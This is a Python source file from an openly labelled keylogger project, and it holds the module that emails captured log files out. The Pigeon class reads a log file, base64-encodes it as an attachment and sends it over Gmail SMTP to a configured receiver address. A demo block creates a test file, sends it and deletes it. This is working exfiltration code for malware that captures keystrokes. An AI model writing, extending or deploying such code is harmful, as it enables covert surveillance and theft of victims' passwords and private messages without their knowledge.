# Keylogger: Capture keystrokes
#     Copyright (C) 2023  Muhammad Faizan

#     This program is free software: you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, either version 3 of the License, or
#     (at your option) any later version.

#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.

#     You should have received a copy of the GNU General Public License
#     along with this program.  If not, see <https://www.gnu.org/licenses/>.
import smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from config import PigeonConfig

class Pigeon:
    def __init__(self, config: PigeonConfig) -> None:
        self.config =config
        message = self.prepare_message()
        attachment = self.prepare_attachment()
        # Add attachment to message and convert message to string
        message.attach(attachment)

        self.message_str = message.as_string()

    def send(self) -> bool:
        if(self.config.debug):
            print(self.message_str)
            return True
        
        try:
            # Log in to server using secure context and send email
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 
                                    465, context=context) as server:
                server.login(self.config.sender_email, 
                                self.config.password)
                server.sendmail(self.config.sender_email,
                                self.config.receiver_email,
                                self.message_str)
        except:
            return False
        
        return True

    def prepare_message(self) -> MIMEMultipart:
        # Create a multipart message and set headers
        message = MIMEMultipart()
        message["From"] = self.config.sender_email
        message["To"] = self.config.receiver_email
        message["Subject"] = self.config.subject

        # Add body to email
        message.attach(MIMEText(self.config.body, "plain"))

        return message

    def prepare_attachment(self) -> MIMEBase:
        # Open log file in binary mode
        with open(self.config.filepath, "rb") as attachment:
            # Add file as application/octet-stream
            # Email client can usually download this automatically as attachment
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        # Encode file in ASCII characters to send by email    
        encoders.encode_base64(part)

        # Add header as key/value pair to attachment part
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {self.config.filename}",
        )

        return part


if __name__ == '__main__':
    from os import remove, path

    config = PigeonConfig()
    config.debug = True

    secret_file = 'secret.txt'

    if config.sender_email=="":
        if not path.exists(secret_file):
            with open(secret_file, 'w') as f:
                f.write("sender@gmail.com\ndemopass")    
        config.get_secret_from_file(secret_file)

    with open(config.filepath, 'w') as demo:
        demo.write("This is a file create for testing puposes, it will be deleted automatically. Don't try to find it.")
    Pigeon(config=config).send()
    
    remove(config.filepath)